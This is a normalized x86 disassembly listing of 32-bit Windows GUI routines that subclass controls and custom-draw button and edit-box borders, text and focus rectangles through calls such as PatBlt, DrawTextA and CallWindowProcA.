lea ecx [ esp + 0xc ]
push 0x1
push 0x1
push ecx
call [ InflateRect@IAT ]
push edi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
test esi 0x200000
je r-xdata
lea eax [ esp + 0xc ]
push eax
push edi
call [ ValidateRect@IAT ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
inc [ esp + 0x14 ]
sub_4397d0
sub esp 0x1c
lea ecx [ esp + 0xc ]
push ebx
push esi
push edi
mov edi [ esp + 0x34 ]
push ebp
mov eax [ edi ]
mov edx [ edi + 0x4 ]
mov ebx [ edi + 0x8 ]
push 0xf
push 0x7
mov [ ecx ] eax
mov eax [ edi + 0xc ]
push 0x7
mov esi [ esp + 0x40 ]
push edi
push esi
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] ebx
mov [ ecx + 0xc ] eax
call sub_437ce0
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
cmp [ esp + 0x44 ] 0x1
jne r-xdata
push 0xf00021
mov eax [ edi + 0x4 ]
push 0x1
mov ecx [ edi ]
push 0x1
push eax
push ecx
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov ecx [ edi + 0x4 ]
push 0x1
mov eax [ edi + 0x8 ]
push 0x1
dec eax
push ecx
push eax
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov eax [ edi + 0xc ]
push 0x1
dec eax
push 0x1
mov ecx [ edi ]
push eax
push ecx
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov eax [ edi + 0xc ]
push 0x1
dec eax
push 0x1
push eax
mov eax [ edi + 0x8 ]
dec eax
push eax
push esi
call [ PatBlt@IAT ]
cmp [ esp + 0x48 ] 0x1
sbb ebx ebx
neg ebx
inc ebx
cmp [ esp + 0x48 ] 0x0
je r-xdata
mov eax [ esp + 0x30 ]
push eax
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
jmp r-xdata
lea eax [ esp + 0x1c ]
push 0xf
push 0x7
push 0x7
push eax
push esi
call sub_437ce0
lea eax [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push eax
call [ InflateRect@IAT ]
mov eax [ rw-data ]
inc [ esp + 0x1c ]
inc [ esp + 0x20 ]
push eax
push esi
call [ SelectObject@IAT ]
mov eax [ esp + 0x28 ]
push 0xf00021
sub eax [ esp + 0x24 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov ecx [ esp + 0x30 ]
push ecx
call [ IsWindowEnabled@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
xor ebp ebp
push eax
push esi
call [ SelectObject@IAT ]
dec [ esp + 0x28 ]
dec [ esp + 0x24 ]
test ebx ebx
jle r-xdata
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x20 ]
push 0xf00021
mov edx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
push eax
push ebx
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov eax [ esp + 0x24 ]
push 0xf00021
sub eax [ esp + 0x20 ]
push ebx
mov ecx [ esp + 0x28 ]
push eax
mov edx [ esp + 0x28 ]
push ecx
push edx
push esi
call [ PatBlt@IAT ]
cmp [ esp + 0x48 ] 0x0
jne r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x14 ]
mov ebx [ esp + 0x3c ]
push eax
push ecx
push ebx
push esi
call sub_437ed0
mov eax [ esp + 0x38 ]
sub eax [ esp + 0x30 ]
sub eax [ esp + 0x28 ]
add esp 0x10
cdq
sub eax edx
sar eax 0x1
add [ esp + 0x20 ] eax
mov eax [ esp + 0x24 ]
sub eax [ esp + 0x1c ]
sub eax [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
cdq
sub eax edx
sar eax 0x1
add [ esp + 0x1c ] eax
mov eax [ esp + 0x20 ]
add eax [ esp + 0x18 ]
cmp eax ecx
jl r-xdata
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x24 ]
push 0xf00021
sub eax [ esp + 0x20 ]
push 0x1
inc eax
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x24 ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov eax [ esp + 0x28 ]
push 0xf00021
sub eax [ esp + 0x24 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
push eax
push 0x1
push ecx
push edx
push esi
call [ PatBlt@IAT ]
lea ecx [ ebx - 0x1 ]
cmp ecx ebp
jle r-xdata
mov ecx [ esp + 0x24 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x1c ]
add eax [ esp + 0x14 ]
cmp eax ecx
jl r-xdata
mov eax ecx
inc ebp
cmp ebx ebp
jg r-xdata
lea eax [ esp + 0x1c ]
push 0xffffffff
push 0xffffffff
push eax
call [ InflateRect@IAT ]
cmp [ esp + 0x48 ] 0x0
mov [ esp + 0x24 ] eax
je r-xdata
mov eax ecx
lea eax [ esp + 0x1c ]
push 0x20
mov ecx [ esp + 0x44 ]
push eax
push ecx
push ebx
push esi
call [ DrawTextA@IAT ]
mov ebp [ GetFocus@IAT ]
call ebp
cmp eax [ esp + 0x30 ]
jne r-xdata
lea eax [ esp + 0x1c ]
push 0x1
push 0x1
mov ebp [ OffsetRect@IAT ]
push eax
call ebp
mov eax [ edi + 0x8 ]
mov ecx [ esp + 0x24 ]
sub eax 0x3
cmp eax ecx
jl r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
lea eax [ esp + 0x1c ]
push 0x1
push 0x1
push eax
call [ InflateRect@IAT ]
lea eax [ esp + 0x1c ]
push edi
push eax
lea eax [ esp + 0x24 ]
push eax
call [ IntersectRect@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push esi
call [ DrawFocusRect@IAT ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x24 ] eax
mov eax [ edi + 0xc ]
sub eax 0x3
cmp eax ecx
jl r-xdata
mov eax ecx
pop ebp
pop edi
pop esi
pop ebx
add esp 0x1c
retn
mov eax [ esp + 0x10 ]
push eax
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x28 ] eax
mov eax ecx
sub_439b10
sub esp 0x154
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x168 ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
mov ebx eax
push edi
and eax 0x20
and ebx 0x1f
mov ebp [ GetParent@IAT ]
mov [ esp + 0x24 ] eax
call ebp
mov esi [ esp + 0x16c ]
push 0x2
mov [ esp + 0x20 ] eax
push esi
call [ SetBkMode@IAT ]
lea eax [ esp + 0x44 ]
mov ebp [ GetClientRect@IAT ]
push eax
push edi
call ebp
mov ebp [ esp + 0x48 ]
lea edx [ esp + 0x44 ]
lea ecx [ esp + 0x34 ]
mov eax [ edx ]
push 0x0
push 0x0
push 0x31
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
push edi
mov edx [ edx + 0xc ]
mov [ ecx + 0x4 ] ebp
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
call [ SendMessageA@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
push 0xf
mov ebp [ GetSysColor@IAT ]
call ebp
push eax
push esi
call [ SetBkColor@IAT ]
push 0x12
call ebp
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x1c ]
push edi
push esi
push 0x135
push eax
call [ SendMessageA@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x40 ]
push eax
mov ebp [ IntersectClipRect@IAT ]
mov eax [ esp + 0x38 ]
push ecx
push edx
push eax
push esi
call ebp
mov ebp [ esp + 0x170 ]
test ebp 0x10
je r-xdata
push eax
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x10 ] eax
push edi
call [ IsWindowEnabled@IAT ]
mov [ esp + 0x28 ] eax
push 0x0
push 0x0
push 0xf2
push edi
call [ SendMessageA@IAT ]
mov [ esp + 0x18 ] 0x0
mov ecx eax
and ecx 0x3
mov [ esp + 0x30 ] ecx
cmp ecx 0x1
sbb ecx ecx
and eax 0x4
inc ecx
mov [ esp + 0x54 ] eax
sar eax 0x1
or eax ecx
mov edx eax
shl eax 0x3
sub eax edx
add eax eax
cmp [ esp + 0x28 ] 0x0
mov [ esp + 0x14 ] eax
jne r-xdata
cmp ebx 0x7
je r-xdata
test ebp 0xa
jne r-xdata
add ecx 0x2
mov eax ecx
shl ecx 0x3
sub ecx eax
mov eax [ esp + 0x14 ]
lea edx [ eax + ecx * 2 ]
mov [ esp + 0x14 ] edx
mov eax [ esp + 0x40 ]
push 0xf00021
sub eax [ esp + 0x3c ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
push eax
mov eax [ esp + 0x44 ]
sub eax [ esp + 0x3c ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
lea eax [ esp + 0x64 ]
push 0x100
push eax
push edi
call [ GetWindowTextA@IAT ]
mov [ esp + 0x24 ] eax
test ebx ebx
je r-xdata
mov eax [ esp + 0x2c ]
push eax
push esi
call [ SelectObject@IAT ]
cmp [ esp + 0x10 ] 0x0
je r-xdata
jmp [ ebx * 4 + jump_table_43a034 ]
cmp ebx 0x1
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x154
retn
mov eax [ esp + 0x10 ]
push eax
push esi
call [ SelectObject@IAT ]
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x64 ]
push eax
lea eax [ esp + 0x48 ]
push ebx
push ecx
push edx
push eax
push esi
push edi
call sub_4397d0
add esp 0x1c
jmp r-xdata
mov [ esp + 0x18 ] 0xd
test ebp 0x4
je r-xdata
cmp [ esp + 0x30 ] 0x2
jne r-xdata
test ebp 0x6
je r-xdata
cmp ebx 0x9
ja r-xdata
test ebp 0x2
je r-xdata
push esi
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
je r-xdata
mov [ esp + 0x18 ] 0x1a
jmp r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x30 ]
lea edx [ esp + 0x64 ]
push eax
push ecx
push edx
push esi
call sub_437ed0
add esp 0x10
cmp [ esp + 0x20 ] 0x0
jne r-xdata
test ebp 0x8
je r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push edi
call [ SelectObject@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
add [ esp + 0x34 ] 0x4
mov eax [ esp + 0x30 ]
add eax [ esp + 0x34 ]
add eax 0x4
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x20 ]
add eax [ esp + 0x38 ]
test ebp 0x20
mov [ esp + 0x40 ] eax
je r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x54 ]
push eax
push ecx
push rw-data
push esi
call sub_437ed0
add esp 0x10
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x54 ]
lea edx [ esp + 0x64 ]
push eax
push ecx
push edx
push esi
call sub_437ed0
mov eax [ esp + 0x50 ]
sub eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
add esp 0x10
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x30 ]
add eax [ esp + 0x38 ]
cmp [ esp + 0x20 ] 0x0
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x44 ]
je r-xdata
mov eax [ esp + 0x44 ]
add eax 0x12
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x4c ]
sub eax 0x12
mov [ esp + 0x3c ] eax
jmp r-xdata
push edi
call [ DeleteDC@IAT ]
mov eax [ esp + 0x18 ]
push 0xcc0020
mov ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x48 ]
push ecx
cmp [ esp + 0x2c ] 0x0
push edi
push 0xd
push 0xe
je r-xdata
mov eax [ esp + 0x20 ]
dec [ esp + 0x4c ]
dec [ esp + 0x50 ]
push 0xf
cdq
sub eax edx
push 0x2
sar eax 0x1
push 0x2
add [ esp + 0x54 ] eax
lea eax [ esp + 0x50 ]
push eax
push esi
call sub_437ce0
lea eax [ esp + 0x58 ]
add esp 0x14
push 0x1
push 0x1
push eax
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x44 ]
push 0xf
push 0x0
push 0x0
push ecx
push esi
call sub_437ce0
add esp 0x14
cmp [ esp + 0x28 ] 0x0
jne r-xdata
mov ebx [ esp + 0x38 ]
mov ebp [ esp + 0x3c ]
lea ecx [ esp + 0x34 ]
lea edx [ esp + 0x54 ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ ecx + 0xc ]
mov ecx [ esp + 0x4c ]
push edx
push edi
mov esi [ ClientToScreen@IAT ]
mov [ edx + 0x4 ] ebx
mov [ edx + 0x8 ] ebp
mov [ edx + 0xc ] eax
mov [ esp + 0x64 ] ecx
call esi
lea ecx [ esp + 0x5c ]
push ecx
push edi
call esi
lea eax [ esp + 0x54 ]
mov ecx [ esp + 0x1c ]
push eax
mov esi [ ScreenToClient@IAT ]
push ecx
call esi
lea ecx [ esp + 0x5c ]
mov eax [ esp + 0x1c ]
push ecx
push eax
call esi
lea ecx [ esp + 0x54 ]
push 0x1
mov edx [ esp + 0x20 ]
push ecx
push edx
call [ InvalidateRect@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x154
retn
add eax 0x12
mov [ esp + 0x34 ] eax
sub [ esp + 0x4c ] 0x12
mov [ esp + 0x34 ] eax
jmp r-xdata
lea eax [ esp + 0x34 ]
push 0x24
mov ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x6c ]
push ecx
push edx
push esi
call [ DrawTextA@IAT ]
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
cmp [ esp + 0x28 ] 0x0
jne r-xdata
sub eax [ esp + 0x50 ]
mov ecx [ esp + 0x50 ]
sub eax 0xd
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax [ esp + 0x4c ]
push ecx
sub eax [ esp + 0x50 ]
mov ecx [ esp + 0x50 ]
sub eax 0xd
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax [ esp + 0x54 ]
push ecx
sub eax 0xe
jmp r-xdata
lea eax [ esp + 0x34 ]
push 0x20
mov ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x6c ]
push ecx
push edx
push esi
call [ DrawTextA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x54 ]
push 0x1
add eax [ esp + 0x38 ]
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x44 ] eax
push ecx
call [ InflateRect@IAT ]
lea ecx [ esp + 0x44 ]
lea eax [ esp + 0x34 ]
push ecx
push eax
lea eax [ esp + 0x3c ]
push eax
call [ IntersectRect@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
push esi
call [ DrawFocusRect@IAT ]
push eax
push esi
call [ BitBlt@IAT ]
push ebx
push edi
call [ SelectObject@IAT ]
sub_43a060
sub esp 0x48
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x60 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x5c ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x68 ]
push 0x0
mov ebx [ esp + 0x68 ]
push eax
mov esi [ esp + 0x64 ]
push ebx
push edi
push esi
call sub_437c00
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp edi 0xf1
mov eax edi
ja r-xdata
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_4379d0
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp eax 0xf3
je r-xdata
je r-xdata
mov ebp 0x4
cmp eax 0x1943
jb r-xdata
sub eax 0x7
cmp eax 0x8
ja r-xdata
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_4379d0
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp edi 0x7
je r-xdata
cmp eax 0x1944
jbe r-xdata
jmp [ eax * 4 + jump_table_43a310 ]
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov [ esp + 0x14 ] eax
cmp edi 0x7
je r-xdata
and eax 0xefffffff
push eax
push 0xfffffff0
push esi
call [ SetWindowLongA@IAT ]
mov eax [ esp + 0x68 ]
pop ebp
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3e8
add esp 0x48
retn 0x10
mov ebp 0x16
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
and al 0x1f
cmp al 0x9
jne r-xdata
mov ebp 0x6
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov edi eax
mov ebx [ esp + 0x64 ]
mov ebp ebx
test ebp ebp
jne r-xdata
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov ebx eax
cmp edi 0xf3
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
or eax 0x10000000
push eax
push 0xfffffff0
push esi
call [ SetWindowLongA@IAT ]
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov [ esp + 0x10 ] eax
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
xor ebp ebp
jmp r-xdata
push 0x0
push 0x0
push 0xf3
push esi
call [ SendMessageA@IAT ]
mov ebp 0x16
jmp r-xdata
and al 0x1f
cmp al 0x7
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
lea eax [ esp + 0x18 ]
mov ebp [ BeginPaint@IAT ]
push eax
push esi
call ebp
mov ebp eax
cmp ebx [ esp + 0x10 ]
je r-xdata
cmp edi 0xf1
jne r-xdata
mov ebp 0x22
jmp r-xdata
test ebx ebx
jne r-xdata
and edi 0x8
or edi 0x6
push edi
push ebp
push esi
call sub_439b10
add esp 0xc
mov eax [ esp + 0x14 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
push esi
call [ GetDC@IAT ]
mov edi eax
test edi edi
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
lea eax [ esp + 0x18 ]
push eax
push esi
call [ EndPaint@IAT ]
xor ebx [ esp + 0x10 ]
test bl 0x3
je r-xdata
push esi
and ebx 0x8
push edi
or ebx ebp
call [ ExcludeUpdateRgn@IAT ]
push ebx
push edi
push esi
call sub_439b10
add esp 0xc
push edi
push esi
call [ ReleaseDC@IAT ]
or ebp 0x4
sub_43a340
sub esp 0x44
push ebx
push esi
mov esi [ esp + 0x50 ]
push edi
push ebp
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] eax
test eax 0x10000000
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x44
retn
cmp [ esp + 0x60 ] 0x3
jne r-xdata
cmp [ esp + 0x5c ] 0x0
je r-xdata
and al 0x3
cmp al 0x3
jne r-xdata
lea eax [ esp + 0x24 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push esi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0x24 ]
push eax
push edi
call ebx
lea ecx [ esp + 0x2c ]
mov bp 0xf
push ecx
push edi
call ebx
push edi
call [ GetDC@IAT ]
mov ebx eax
mov eax [ esp + 0x10 ]
and eax 0x100000
mov [ esp + 0x1c ] eax
je r-xdata
push esi
call [ HideCaret@IAT ]
push 0x0
push 0x0
push 0x157
push esi
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
and eax 0x200000
mov [ esp + 0x20 ] eax
je r-xdata
mov bp 0x7
push 0xfffffff4
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x5c ]
sub ecx eax
cmp ecx 0xfffffc18
jne r-xdata
and bp 0xfffb
lea eax [ esp + 0x24 ]
push ebp
push eax
push ebx
call sub_437e20
add esp 0xc
cmp [ esp + 0x60 ] 0x3
jne r-xdata
mov [ esp + 0x18 ] 0x29a
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x1944
push edi
call [ SendMessageA@IAT ]
cmp [ esp + 0x18 ] 0x29a
mov [ esp + 0x34 ] eax
jne r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
and al 0x3
cmp al 0x3
jne r-xdata
lea eax [ esp + 0x44 ]
push 0x10
push eax
push edi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x44 ]
push r--data
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x1943
push edi
call [ SendMessageA@IAT ]
mov [ esp + 0x34 ] eax
cmp [ esp + 0x1c ] 0x0
je r-xdata
lea eax [ esp + 0x24 ]
push 0x4
inc [ esp + 0x30 ]
push 0x0
push 0x0
push eax
push ebx
call sub_437ce0
mov eax [ esp + 0x38 ]
dec [ esp + 0x40 ]
mov ebp [ esp + 0x40 ]
mov [ esp + 0x58 ] eax
add esp 0x14
push 0x2
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0x8
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x2c ] ebp
push 0x7
push eax
push ebx
call sub_437ce0
mov eax [ esp + 0x58 ]
mov [ esp + 0x38 ] eax
add esp 0x14
mov ebp [ esp + 0x2c ]
push 0x2
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0xc
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x2c ] ebp
push 0x7
push eax
push ebx
call sub_437ce0
add esp 0x14
push esi
call sub_439760
add esp 0x4
jmp r-xdata
push edi
call [ GetParent@IAT ]
mov [ esp + 0x14 ] eax
push 0x2
lea eax [ esp + 0x28 ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
push edi
call [ MapWindowPoints@IAT ]
push ebx
push edi
call [ ReleaseDC@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
call [ GetDC@IAT ]
cmp [ esp + 0x5c ] 0x0
mov ebx eax
je r-xdata
cmp [ esp + 0x18 ] 0x1
jne r-xdata
push ebx
push edi
call [ ReleaseDC@IAT ]
cmp [ esp + 0x5c ] 0x0
je r-xdata
lea eax [ esp + 0x24 ]
push 0x8
inc [ esp + 0x34 ]
push 0x0
push 0x0
push eax
push ebx
call sub_437ce0
dec [ esp + 0x44 ]
add esp 0x14
mov ebp [ esp + 0x30 ]
push 0x15
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0x4
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x30 ] ebp
push 0x7
push eax
push ebx
call sub_437ce0
add esp 0x14
and bp 0xfffd
inc [ esp + 0x28 ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
and eax 0x3
cmp eax 0x2
je r-xdata
cmp [ esp + 0x34 ] 0x3eb
jne r-xdata
push esi
call [ ShowCaret@IAT ]
push 0x0
push 0x0
push 0x157
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
cmp eax 0x3
je r-xdata
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push ebx
push eax
call [ ReleaseDC@IAT ]
push esi
call [ ShowCaret@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x44
retn
and bp 0xfff7
push 0x5
push edi
call [ GetWindow@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
push eax
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x34 ]
push 0x1008
sub eax [ esp + 0x40 ]
lea ecx [ esp + 0x28 ]
add [ esp + 0x30 ] eax
push ecx
push ebx
call sub_437e20
mov eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
add [ esp + 0x38 ] eax
add esp 0xc
jmp r-xdata
sub_43a680
sub esp 0x4
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x1c ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x18 ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
mov ebp [ esp + 0x24 ]
test eax eax
mov eax [ esp + 0x20 ]
push ebp
mov ebx [ esp + 0x2c ]
push eax
push edi
push esi
push ebx
push esi
je r-xdata
mov ebx [ esp + 0x28 ]
mov ebp [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
push ebx
mov esi [ esp + 0x1c ]
push ebp
push eax
push edi
push esi
call sub_437c00
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov [ esp + 0x10 ] eax
cmp ebx 0x3
jne r-xdata
call sub_4379d0
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
mov eax [ esp + 0x10 ]
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov ecx eax
and cl 0x3
cmp cl 0x2
jne r-xdata
cmp edi 0x46
je r-xdata
je r-xdata
cmp edi 0x18
ja r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
cmp [ rw-data ] 0x30a
jb r-xdata
cmp edi 0x1943
jb r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp edi 0xf
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
push ebp
push esi
call sub_4396a0
add esp 0x8
jmp r-xdata
cmp edi 0x1944
jbe r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
cmp ebx 0x3
jne r-xdata
mov eax 0x3ea
mov [ ebp ] 0x1
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
jmp r-xdata
push 0x0
push esi
call sub_4396a0
add esp 0x8
jmp r-xdata
push ebx
push 0x1
push esi
call sub_43a340
add esp 0xc
jmp r-xdata
and eax 0x3
cmp eax 0x2
je r-xdata
cmp eax 0x3
jne r-xdata
sub_43a800
sub esp 0x20
push ebx
push esi
mov esi [ esp + 0x30 ]
push edi
cmp esi 0x82
jne r-xdata
xor eax eax
mov edi [ esp + 0x30 ]
mov ax [ rw-data ]
push eax
push edi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
push eax
mov edi [ esp + 0x34 ]
push ecx
push edx
push esi
push edi
call sub_437c00
add esp 0x14
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x18
ja r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push eax
push ecx
push esi
push edi
push edx
push edi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x83
ja r-xdata
je r-xdata
cmp esi 0x1943
jb r-xdata
je r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp esi 0xf
je r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push eax
push ecx
push esi
push edi
push edx
push edi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x1944
jbe r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp esi 0x46
je r-xdata
cmp [ esp + 0x38 ] 0x0
jne r-xdata
mov ebx [ esp + 0x40 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
push eax
push ecx
push esi
push edi
push ebx
push edi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov esi eax
push ebx
push 0x0
push edi
call sub_43a340
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x3c ]
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3e9
add esp 0x20
retn
jmp r-xdata
lea eax [ esp + 0x1c ]
push eax
push edi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push ecx
push eax
push esi
push edi
push edx
push edi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov esi eax
mov edx [ esp + 0x3c ]
lea ecx [ esp + 0xc ]
mov eax [ edx ]
mov ebx [ edx + 0x4 ]
